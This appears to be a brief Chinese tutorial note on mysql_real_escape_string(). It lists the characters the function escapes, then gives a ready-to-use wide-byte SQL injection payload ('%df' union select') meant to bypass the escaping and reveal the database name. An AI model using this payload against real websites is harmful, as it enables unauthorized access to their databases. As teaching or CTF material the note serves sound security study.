 mysql_real_escape_string()

下列字符受影响

```
\x00
\n
\r
\
'
''
\x1a
```

如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。



直接注

```
?id=-1%df' union select 1,2,database() --+
```

后续为一般步骤。
